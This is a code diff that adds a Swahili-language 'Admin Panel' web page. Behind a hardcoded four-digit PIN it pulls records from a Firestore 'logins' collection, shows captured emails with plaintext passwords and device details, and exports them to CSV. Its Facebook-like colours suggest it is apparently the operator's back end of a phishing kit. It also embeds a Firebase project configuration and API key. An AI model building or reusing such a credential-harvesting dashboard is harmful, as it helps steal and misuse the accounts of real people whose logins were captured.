@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel</title>
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+      background: #1c1e21;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      color: #fff;
+    }
+
+    /* ── LOGIN SCREEN ── */
+    #loginScreen {
+      width: 100%;
+      max-width: 320px;
+      text-align: center;
+    }
+
+    .admin-title {
+      font-size: 28px;
+      font-weight: 800;
+      color: #1877f2;
+      margin-bottom: 8px;
+    }
+
+    .admin-sub {
+      font-size: 14px;
+      color: #90949c;
+      margin-bottom: 24px;
+    }
+
+    .admin-input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #3a3b3c;
+      border-radius: 6px;
+      font-size: 17px;
+      color: #fff;
+      background: #3a3b3c;
+      outline: none;
+      font-family: inherit;
+      margin-bottom: 12px;
+      text-align: center;
+      letter-spacing: 4px;
+    }
+    .admin-input::placeholder { letter-spacing: 0; color: #606770; }
+    .admin-input:focus { border-color: #1877f2; }
+
+    .btn-enter {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .btn-enter:hover { background: #166fe5; }
+
+    .err-login {
+      color: #e02b2b;
+      font-size: 13px;
+      margin-top: 10px;
+      display: none;
+    }
+    .err-login.show { display: block; }
+
+    /* ── ADMIN PANEL ── */
+    #adminPanel {
+      display: none;
+      width: 100%;
+      max-width: 700px;
+    }
+
+    .panel-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+
+    .panel-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1877f2;
+    }
+
+    .panel-count {
+      font-size: 13px;
+      color: #90949c;
+    }
+
+    .btn-csv {
+      padding: 8px 16px;
+      background: #42b72a;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .btn-csv:hover { background: #36a420; }
+
+    .btn-signout {
+      padding: 8px 16px;
+      background: #3a3b3c;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    .btn-signout:hover { background: #4a4b4c; }
+
+    .table-wrap {
+      overflow-x: auto;
+      border-radius: 8px;
+      background: #242526;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 14px;
+    }
+
+    thead {
+      background: #1877f2;
+    }
+
+    thead th {
+      padding: 12px 16px;
+      text-align: left;
+      font-weight: 700;
+      color: #fff;
+      white-space: nowrap;
+    }
+
+    tbody tr {
+      border-bottom: 1px solid #3a3b3c;
+      transition: background 0.1s;
+    }
+
+    tbody tr:hover { background: #3a3b3c; }
+
+    tbody td {
+      padding: 12px 16px;
+      color: #e4e6eb;
+      word-break: break-all;
+    }
+
+    .badge-no {
+      background: #3a3b3c;
+      color: #90949c;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+    }
+
+    .loading {
+      text-align: center;
+      padding: 40px;
+      color: #90949c;
+      font-size: 15px;
+    }
+
+    .empty {
+      text-align: center;
+      padding: 40px;
+      color: #90949c;
+      font-size: 15px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Login Screen -->
+  <div id="loginScreen">
+    <div class="admin-title">🔐 Admin</div>
+    <div class="admin-sub">Weka password ya siri</div>
+    <input class="admin-input" type="password" id="pinInput" placeholder="••••" maxlength="20">
+    <button class="btn-enter" onclick="ingia()">Ingia</button>
+    <div class="err-login" id="errLogin">Password si sahihi.</div>
+  </div>
+
+  <!-- Admin Panel -->
+  <div id="adminPanel">
+    <div class="panel-header">
+      <div>
+        <div class="panel-title">📋 Logins</div>
+        <div class="panel-count" id="countLabel">Inapakia...</div>
+      </div>
+      <div style="display:flex;gap:8px;">
+        <button class="btn-csv" onclick="downloadCSV()">⬇ CSV</button>
+        <button class="btn-signout" onclick="toka()">Toka</button>
+      </div>
+    </div>
+
+    <div class="table-wrap">
+      <div class="loading" id="loadingMsg">⏳ Inapakia data...</div>
+      <table id="dataTable" style="display:none;">
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Email</th>
+            <th>Password</th>
+            <th>Wakati</th>
+            <th>Kifaa</th>
+          </tr>
+        </thead>
+        <tbody id="tableBody"></tbody>
+      </table>
+      <div class="empty" id="emptyMsg" style="display:none;">Hakuna data bado.</div>
+    </div>
+  </div>
+
+<script type="module">
+  import { initializeApp }
+    from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+  import { getFirestore, collection, getDocs, orderBy, query }
+    from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+  const ADMIN_PIN = "4944";
+
+  const firebaseConfig = {
+    apiKey:            "AIzaSyDCKHDp1VpDTRr4-HGqgE1OFkEwWIDZyqI",
+    authDomain:        "sadegpt-f79d7.firebaseapp.com",
+    projectId:         "sadegpt-f79d7",
+    storageBucket:     "sadegpt-f79d7.firebasestorage.app",
+    messagingSenderId: "474328809093",
+    appId:             "1:474328809093:web:e94c3af5eca2e7949fb3ec"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db  = getFirestore(app);
+
+  let allData = [];
+
+  /* ── Login ── */
+  function ingia() {
+    const pin = document.getElementById("pinInput").value;
+    if (pin === ADMIN_PIN) {
+      document.getElementById("loginScreen").style.display = "none";
+      document.getElementById("adminPanel").style.display  = "block";
+      loadData();
+    } else {
+      document.getElementById("errLogin").classList.add("show");
+      document.getElementById("pinInput").value = "";
+    }
+  }
+
+  /* ── Load Firestore data ── */
+  async function loadData() {
+    try {
+      const q = query(collection(db, "logins"), orderBy("wakati", "desc"));
+      const snap = await getDocs(q);
+
+      allData = [];
+      snap.forEach(doc => {
+        allData.push({ id: doc.id, ...doc.data() });
+      });
+
+      renderTable(allData);
+    } catch (e) {
+      // Try without orderBy if index missing
+      try {
+        const snap = await getDocs(collection(db, "logins"));
+        allData = [];
+        snap.forEach(doc => allData.push({ id: doc.id, ...doc.data() }));
+        renderTable(allData);
+      } catch (e2) {
+        document.getElementById("loadingMsg").textContent = "Hitilafu: " + e2.message;
+      }
+    }
+  }
+
+  /* ── Render table ── */
+  function renderTable(data) {
+    document.getElementById("loadingMsg").style.display = "none";
+    document.getElementById("countLabel").textContent   = `Jumla: ${data.length} rekodi`;
+
+    if (data.length === 0) {
+      document.getElementById("emptyMsg").style.display = "block";
+      return;
+    }
+
+    document.getElementById("dataTable").style.display = "table";
+    const tbody = document.getElementById("tableBody");
+    tbody.innerHTML = "";
+
+    data.forEach((row, i) => {
+      const wakati = row.wakati
+        ? new Date(row.wakati.seconds * 1000).toLocaleString("sw-TZ")
+        : "—";
+
+      // Shorten userAgent
+      let kifaa = row.userAgent || "—";
+      if (kifaa.includes("Android")) kifaa = "Android";
+      else if (kifaa.includes("iPhone")) kifaa = "iPhone";
+      else if (kifaa.includes("Windows")) kifaa = "Windows";
+      else if (kifaa.includes("Mac")) kifaa = "Mac";
+      else kifaa = "Nyingine";
+
+      const tr = document.createElement("tr");
+      tr.innerHTML = `
+        <td><span class="badge-no">${i + 1}</span></td>
+        <td>${row.email || "—"}</td>
+        <td>${row.password || "—"}</td>
+        <td>${wakati}</td>
+        <td>${kifaa}</td>
+      `;
+      tbody.appendChild(tr);
+    });
+  }
+
+  /* ── Download CSV ── */
+  function downloadCSV() {
+    if (allData.length === 0) return;
+    let csv = "Namba,Email,Password,Wakati\n";
+    allData.forEach((row, i) => {
+      const wakati = row.wakati
+        ? new Date(row.wakati.seconds * 1000).toLocaleString()
+        : "";
+      csv += `${i+1},"${row.email || ""}","${row.password || ""}","${wakati}"\n`;
+    });
+    const blob = new Blob([csv], { type: "text/csv" });
+    const url  = URL.createObjectURL(blob);
+    const a    = document.createElement("a");
+    a.href     = url;
+    a.download = "logins.csv";
+    a.click();
+    URL.revokeObjectURL(url);
+  }
+
+  /* ── Sign out ── */
+  function toka() {
+    document.getElementById("adminPanel").style.display  = "none";
+    document.getElementById("loginScreen").style.display = "block";
+    document.getElementById("pinInput").value = "";
+    allData = [];
+  }
+
+  /* ── Enter key ── */
+  document.getElementById("pinInput").addEventListener("keydown", e => {
+    if (e.key === "Enter") ingia();
+  });
+
+  window.ingia       = ingia;
+  window.toka        = toka;
+  window.downloadCSV = downloadCSV;
+</script>
+
+</body>
+</html>
